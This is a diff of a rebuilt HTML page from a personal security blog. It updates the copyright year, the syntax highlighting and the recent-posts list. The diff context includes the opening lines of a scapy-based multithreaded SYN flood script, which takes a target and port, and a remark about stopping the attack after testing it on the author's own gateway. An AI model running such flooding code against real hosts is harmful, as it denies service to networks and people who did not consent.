@@ -327,7 +327,7 @@
 </nav>
 
   <p>
-  &copy; 2018.
+  &copy; 2019.
   <a href="/LICENSE.md">Zwerd Web Deisgn</a>
 </p>
 
@@ -995,15 +995,15 @@ The problem with that operation is that we always need to resend some packets th
 
 <p>To kill the attack just type ctrl+c, in my case after I killed the attack I was able to connect my DG.</p>
 
-<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
-<span class="c">#########################################</span>
-<span class="c">#</span>
-<span class="c"># SYNflood - A multithreaded SYN Flooder</span>
-<span class="c"># author: arthurnn</span>
-<span class="c">#</span>
-<span class="c">#</span>
-<span class="c">#########################################</span>
-<span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">threading</span>
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
+#########################################
+#
+# SYNflood - A multithreaded SYN Flooder
+# author: arthurnn
+#
+#
+#########################################
+</span><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">threading</span>
 <span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
@@ -1014,8 +1014,8 @@ The problem with that operation is that we always need to resend some packets th
 <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
 
 <span class="n">total</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="n">conf</span><span class="o">.</span><span class="n">iface</span><span class="o">=</span><span class="s">'en1'</span><span class="p">;</span><span class="c">#network card XD</span>
-
+<span class="n">conf</span><span class="o">.</span><span class="n">iface</span><span class="o">=</span><span class="s">'en1'</span><span class="p">;</span><span class="c1">#network card XD
+</span>
 <span class="k">class</span> <span class="nc">sendSYN</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
 	<span class="k">global</span> <span class="n">target</span><span class="p">,</span> <span class="n">port</span>
 	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
@@ -1107,6 +1107,15 @@ The problem with that operation is that we always need to resend some packets th
     
       <li>
         <h3>
+          <a href="/2019/02/17/new_open_source_app.html">
+            MyGmach - My New Open Source App (react native app)
+            <small>17 Feb 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
           <a href="/2018/11/05/jekyll_error.html">
             Jekyll Error - `block in materialize'
             <small>05 Nov 2018</small>
@@ -1119,15 +1128,6 @@ The problem with that operation is that we always need to resend some packets th
           <a href="/2018/04/23/javascript-tutorial.html">
             JavaScript - the future of programming.
             <small>23 Apr 2018</small>
-          </a>
-        </h3>
-      </li>
-    
-      <li>
-        <h3>
-          <a href="/2018/02/15/SQL-Injection.html">
-            SQL Injection
-            <small>15 Feb 2018</small>
           </a>
         </h3>
       </li>
